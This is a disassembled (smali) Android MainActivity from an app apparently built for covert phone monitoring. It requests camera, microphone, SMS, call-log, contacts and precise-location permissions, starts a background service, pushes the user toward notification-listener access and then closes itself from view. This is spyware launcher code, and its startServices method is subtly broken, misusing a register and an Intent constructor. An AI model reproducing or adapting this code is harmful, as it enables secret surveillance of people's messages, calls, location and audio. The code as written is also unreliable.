.class public Lcom/etechd/l3mon/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

.field private static final PERMISSIONS_REQUEST_CODE:I = 0x7b
.field private static final REQUIRED_PERMISSIONS:[Ljava/lang/String;

# direct methods
.method static constructor <clinit>()V
    .locals 12

    .line 20
    const-string v0, "android.permission.CAMERA"
    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"
    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"
    const-string v3, "android.permission.READ_SMS"
    const-string v4, "android.permission.SEND_SMS"
    const-string v5, "android.permission.READ_PHONE_STATE"
    const-string v6, "android.permission.READ_CALL_LOG"
    const-string v7, "android.permission.RECORD_AUDIO"
    const-string v8, "android.permission.ACCESS_COARSE_LOCATION"
    const-string v9, "android.permission.ACCESS_FINE_LOCATION"
    const-string v10, "android.permission.READ_CONTACTS"
    const-string v11, "android.permission.POST_NOTIFICATIONS"

    filled-new-array/range {v0 .. v11}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/etechd/l3mon/MainActivity;->REQUIRED_PERMISSIONS:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private checkAndRequestPermissions()V
    .locals 6

    .line 80
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_2

    .line 81
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 83
    .local v0, "permissionsToRequest":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    sget-object v1, Lcom/etechd/l3mon/MainActivity;->REQUIRED_PERMISSIONS:[Ljava/lang/String;

    array-length v2, v1

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v2, :cond_1

    aget-object v4, v1, v3

    .line 84
    .local v4, "permission":Ljava/lang/String;
    invoke-virtual {p0, v4}, Lcom/etechd/l3mon/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-eqz v5, :cond_0

    .line 85
    invoke-interface {v0, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 83
    .end local v4    # "permission":Ljava/lang/String;
    :cond_0
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 89
    :cond_1
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_2

    .line 90
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    new-array v1, v1, [Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Ljava/lang/String;

    .line 91
    .local v1, "permissionsArray":[Ljava/lang/String;
    const/16 v2, 0x7b

    invoke-virtual {p0, v1, v2}, Lcom/etechd/l3mon/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    .line 94
    .end local v0    # "permissionsToRequest":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    .end local v1    # "permissionsArray":[Ljava/lang/String;
    :cond_2
    return-void
.end method

.method private isNotificationServiceRunning()Z
    .locals 4

    .line 105
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 106
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    nop

    .line 107
    const-string v1, "enabled_notification_listeners"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 108
    .local v1, "enabledNotificationListeners":Ljava/lang/String;
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    .line 109
    .local v2, "packageName":Ljava/lang/String;
    if-eqz v1, :cond_0

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x1

    goto :goto_0

    :cond_0
    const/4 v3, 0x0

    :goto_0
    return v3
.end method

.method private startServices()V
    .locals 2

    .line 97
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/etechd/l3mon/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 98
    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->isNotificationServiceRunning()Z

    move-result v0

    .line 99
    .local v0, "isNotificationServiceRunning":Z
    if-nez v0, :cond_0

    .line 100
    new-instance v1, Landroid/content/Intent;

    const-string v1, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v1}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 102
    :cond_0
    return-void
.end method

# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 25
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 26
    const/high16 v0, 0x7f040000

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->setContentView(I)V
    
    .line 28
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_0

    .line 29
    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkAndRequestPermissions()V

    goto :goto_0

    .line 31
    :cond_0
    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->startServices()V
    
    .line 32
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V

    .line 34
    :goto_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 3
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .line 61
    const/16 v0, 0x7b

    if-ne p1, v0, :cond_1

    .line 62
    array-length v0, p3

    if-lez v0, :cond_1

    .line 63
    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->startServices()V
    
    .line 64
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V

    .line 77
    :cond_1
    return-void
.end method
